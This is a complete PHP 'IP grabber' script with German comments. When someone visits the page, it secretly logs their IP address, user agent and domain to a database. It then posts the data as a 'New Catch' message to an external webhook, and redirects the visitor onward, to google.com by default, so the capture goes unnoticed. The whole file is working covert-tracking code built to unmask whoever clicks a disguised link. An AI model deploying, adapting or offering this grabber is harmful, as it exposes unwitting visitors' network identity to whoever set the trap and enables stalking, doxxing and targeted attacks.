<?php
require 'config.php';

$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$domain = $_SERVER['HTTP_HOST'];

$config = json_decode(file_get_contents('config.json'), true);
$grabberStatus = isset($config['grabber_status']) ? $config['grabber_status'] : 'on'; // Standardwert "on"

$redirectWaitTime = isset($config['redirect_wait_time']) ? $config['redirect_wait_time'] : 0; // Standardwert 0 (keine Verzögerung)

if ($grabberStatus === 'on') {
    $stmt = $pdo->prepare("INSERT INTO logs (ip, user_agent, domain) VALUES (?, ?, ?)");
    $stmt->execute([$ip, $userAgent, $domain]);

    $logId = $pdo->lastInsertId();

    if (isset($config['webhook_enabled']) && $config['webhook_enabled'] === true) {
        $webhookUrl = isset($config['webhook_url']) ? $config['webhook_url'] : '';

        if (!empty($webhookUrl)) {
            $message = [
                "content" => "
                
                📡 **Logging System. New Catch**  
                🔹 **ID:** $logId  
                🔹 **IP:** $ip  
                🔹 **User-Agent:** $userAgent  
                🔹 **Domain:** $domain  
                ⏳ **Timestamp:** " . date("Y-m-d H:i:s
                
                ")
            ];

            $options = [
                "http" => [
                    "header"  => "Content-Type: application/json",
                    "method"  => "POST",
                    "content" => json_encode($message),
                ]
            ];
            $context  = stream_context_create($options);
            file_get_contents($webhookUrl, false, $context);
        } else {
            error_log('Webhook URL ist leer. Webhook wurde nicht gesendet.');
        }
    }
}

if (isset($config['redirect_url']) && !empty($config['redirect_url'])) {
    $redirectUrl = $config['redirect_url'];
} else {
    $redirectUrl = 'https://google.com';
}

header("Refresh: $redirectWaitTime; URL=$redirectUrl");
exit;
?>
